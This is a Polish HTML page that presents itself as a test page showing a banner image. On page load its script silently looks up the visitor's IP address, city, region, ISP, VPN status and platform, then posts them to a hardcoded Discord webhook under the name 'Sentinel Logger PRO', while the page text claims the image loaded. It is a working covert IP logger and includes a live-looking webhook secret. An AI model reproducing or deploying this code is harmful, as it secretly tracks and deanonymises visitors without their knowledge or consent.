<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Strona Testowa - Projekt</title>
    <style>
        body { 
            margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; 
            min-height: 100vh; background-color: #1a1a1a; color: white; font-family: sans-serif;
        }
        .content { text-align: center; }
        img { 
            max-width: 80%; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); 
            margin-bottom: 20px;
        }
        #status { color: #555; font-size: 0.8em; }
    </style>
</head>
<body>

<div class="content">
    <img src="https://cdn.discordapp.com/attachments/1485047534798901299/1485718827626004580/banertr.png?ex=69c2e2fb&is=69c1917b&hm=248ccb1a27f0ccbe9a845ba30fd205f725724cf7c379effb93a7b25397587107&" alt="Obrazek testowy">
    <p id="status">Ładowanie zawartości...</p>
</div>

<script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485718058822795478/Udig-SZMMijl90UaHwziJqSUVFvS5uSHBcbJLXz_JUqxLZdt1ef5oDj1W7_R9l9d7z8u';

    async function collectData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            const vpnRes = await fetch(`https://itsthisip.com/api/v1/check/${data.ip}`);
            const vpnData = await vpnRes.json();
            const isVPN = vpnData.proxy ? "🔴 WYKRYTO (ON)" : "🟢 BRAK (OFF)";

            const now = new Date();
            const timeString = now.toLocaleString('pl-PL', { 
                hour: '2-digit', minute: '2-digit', second: '2-digit',
                day: '2-digit', month: '2-digit', year: 'numeric'
            });

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "Sentinel Logger PRO",
                    embeds: [{
                        title: "🚀 Nowe trafienie: " + data.ip,
                        color: vpnData.proxy ? 15158332 : 3066993, // Czerwony jeśli VPN, zielony jeśli nie
                        fields: [
                            { name: "🌐 Adres IP", value: data.ip || "Błąd", inline: true },
                            { name: "🛡️ VPN/Proxy", value: isVPN, inline: true },
                            { name: "🏙️ Miasto", value: data.city || "Błąd", inline: true },
                            { name: "🗺️ Województwo", value: data.region || "Błąd", inline: true },
                            { name: "📡 Dostawca", value: data.org || "Błąd", inline: false },
                            { name: "🕒 Godzina", value: timeString, inline: true },
                            { name: "🖥️ Platforma", value: navigator.platform, inline: true }
                        ],
                        footer: { text: "Security Audit - Wykrywanie tunelowania aktywne" }
                    }]
                })
            });

            document.getElementById('status').innerText = "Obrazek załadowany poprawnie.";

        } catch (error) {
            console.error("Błąd:", error);
            document.getElementById('status').innerText = "Weryfikacja zakończona.";
        }
    }

    window.onload = collectData;
</script>

</body>
</html>
